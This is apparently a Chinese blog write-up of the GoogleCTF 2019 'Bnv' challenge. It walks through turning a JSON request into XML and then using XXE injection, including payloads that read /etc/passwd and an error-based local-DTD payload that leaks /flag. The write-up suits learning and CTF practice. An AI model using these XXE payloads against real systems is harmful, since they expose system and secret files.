---
title: '[GoogleCTF2019 Quals]Bnv'
date: 2024-09-12 19:02:47
tags: xxe
categories: 刷题笔记
---

### [GoogleCTF2019 Quals]Bnv

我们打开页面，没发现有啥信息，我们进行抓包

![image-20240919204517785](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409192045873.png)

我们看到json格式的，将json改为xml格式，尝试xxe注入

```
Content-type: application/json
Content-type: application/xml
```

首先构造DTD,声明实体b和元素message

其实之前做得题目都是不用申明元素的，这里如果不申明会报

<!--more-->

```
No declaration for element message, line 5, column 23
```

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE message [     <!-- 定义此文档是message类型的文档。-->
        <!ELEMENT message (#PCDATA)> <!-- 定义message元素为 "#PCDATA" 类型 -->
    <!ENTITY b "135601360123502401401250">
]>
<message>&b;</message>

```

![image-20240919204955823](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409192049937.png)

成功执行

再尝试加上name实体来加载内部文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE message [
        <!ELEMENT message (#PCDATA)>
    <!ENTITY b "135601360123502401401250">
    <!ENTITY % name SYSTEM "file:///etc/passwd">
        %name;
]>
<message>&b;</message>

```

> 发生报错：internal error: xmlParseInternalSubset: error detected in Markup declaration, line 1, column 1
>
> 文档类型声明包含或指向的标记声明必须格式正确
> 这意味着文件已经正确加载了，但由于它不是个格式良好的xml文件 所以它中断了。

如果我们尝试引用系统不存在的文件，会报错：

> failed to load external entity “file:///xxxx”, line 6, column 10

我们可以试出flag在根目录下

然后看这篇文章[Exploiting XXE with local DTD files (mohemiv.com)](https://mohemiv.com/tags/xxe/)

Linux设备可在/usr/share/yelp/dtd/docbookx.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。
![img](https://i-blog.csdnimg.cn/blog_migrate/b50742e8d6346370f99fd538a0e3d8ed.png)

首先读/flag，第二次把/flag的里的值做实体来读取，因为/flag的里的值这个实体不存在，就会报错返回，得到flag。

像那篇文章里面写得

![image-20240919205514109](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409192055152.png)

payload:

```
<?xml version="1.0"?>

<!DOCTYPE message[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///flag">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
'>
%local_dtd;
]>
//因为我们要的是报错嘛，后面的文档部分有没有无所谓了
```


得到flag

![image-20240919205554934](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409192055992.png)
